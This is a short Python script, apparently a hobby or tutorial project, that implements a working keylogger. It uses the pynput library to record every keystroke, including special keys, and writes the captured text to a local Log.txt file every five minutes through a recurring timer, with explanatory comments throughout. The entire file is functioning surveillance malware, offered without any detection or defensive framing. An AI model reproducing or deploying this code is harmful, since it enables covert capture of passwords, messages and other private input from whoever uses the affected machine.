import pynput.keyboard #used to actually record the keystrokes from the keyboard
import threading#this will be used for the timer so we can have that running as well as the key presses
#https://pynput.readthedocs.io/en/latest/

log = ""


def key_pressed(key):
    global log
    try:
        log = log + str(key.char)#char to avoid the 'u' showing up in the log
    except AttributeError:
        if key == key.space:# if the space key is pressed than the word key.space is replaced with blank space as so " "
            log = log + " "
        else:
            log = log + " " + str(key) + " "#fixes the issue with keys like backspace and enter


def UpdateLog():
    global log
    Write(log)
    log = ""
    LogTimer = threading.Timer(300, UpdateLog)#every 5 minutes call the report function to log the keys pressed-recursive function
    LogTimer.start()


Listener = pynput.keyboard.Listener( on_press=key_pressed)  # set the listener and when a key is pressend called the function "key_pressed"

def Write(log):
    f = open("Log.txt", "a")
    f.write(log)
    f.close()

#start listener
with Listener:
    UpdateLog()
    Listener.join()
